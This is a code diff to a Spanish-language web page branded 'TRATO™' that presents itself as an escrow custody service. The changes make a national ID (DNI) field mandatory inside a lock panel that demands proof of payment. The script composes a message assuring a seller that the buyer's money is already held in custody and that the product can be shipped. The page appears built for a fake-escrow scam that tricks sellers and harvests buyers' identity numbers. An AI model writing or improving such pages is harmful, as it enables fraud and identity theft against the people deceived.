@@ -48,6 +48,11 @@
             <h2 style="color: #ff3333; text-transform: uppercase; font-size: 1.3em; margin-bottom: 5px;">⚠️ PASO OBLIGATORIO</h2>
             <p style="font-size: 0.85em; color: #aaa; margin-bottom: 25px;">Para activar la custodia y resguardar tu dinero, debés enviar el comprobante de pago al equipo de TRATO™ antes de continuar.</p>
             
+            <div class="input-group" style="margin-bottom: 20px; text-align: left;">
+                <label for="comprador-dni" style="color: #ff3333; font-size: 0.8em; margin-bottom: 5px; display: block;">Cumpla con su DNI aquí</label>
+                <input type="tel" id="comprador-dni" placeholder="Ej. 35123456" pattern="[0-9]*" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')" style="width: 92%; padding: 10px; border: 1px solid #ff3333; background: #050505; color: #fff; border-radius: 8px;">
+            </div>
+            
             <button onclick="enviarComprobanteObligatorio()" class="btn-portal btn-danger">📤 ENVIAR COMPROBANTE A TRATO</button>
             <button id="btn-continuar" onclick="desbloquearPantalla()" class="btn-portal" style="border-color: #00d4ff; color: #00d4ff; margin-top: 15px;" disabled>✅ YA LO ENVIÉ, CONTINUAR</button>
             
@@ -62,11 +67,6 @@
         <div class="status-box">
             <p class="status-text">🔒 ESTADO: CUSTODIA ACTIVA</p>
             <p id="info-operacion" style="font-size: 0.9em; color: #aaa;">Cargando detalles de la operación...</p>
-        </div>
-
-        <div class="input-group" style="margin-bottom: 20px; text-align: left;">
-            <label for="comprador-dni" style="color: #00d4ff; font-size: 0.8em; margin-bottom: 5px; display: block;">DECLARACIÓN DE IDENTIDAD (DNI)</label>
-            <input type="text" id="comprador-dni" placeholder="Tu DNI o el titular de la cuenta" style="width: 92%; padding: 10px; border: 1px solid #00d4ff; background: #050505; color: #fff; border-radius: 8px;">
         </div>
 
         <button onclick="enviarComprobanteObligatorio()" class="btn-portal btn-danger">📤 ENVIAR COMPROBANTE A TRATO</button>
@@ -126,6 +126,10 @@
             let mensaje = "";
             const numeroSoporte = "5493456528480";
             const compradorDni = document.getElementById('comprador-dni').value;
+
+            if (!compradorDni) {
+                return alert("Por favor, ingresa tu DNI en el panel de bloqueo antes de notificar.");
+            }
             
             if (tipo === 'envio') {
                 mensaje = `🛡️ *NOTIFICACIÓN DE PAGO TRATO™*\n\n¡Hola! Te confirmo que ya realicé el pago. El dinero se encuentra resguardado en el sistema de custodia de TRATO™ (RichardBro). Ya podés proceder con el despacho del producto.\n\n* ID de Operación / Comprobante: ${opID}\n* Producto: ${decodeURIComponent(producto)}\n* Monto: $ ${precio}\n* DNI del Comprador: ${compradorDni}\n\nQuedo a la espera del envío.`;
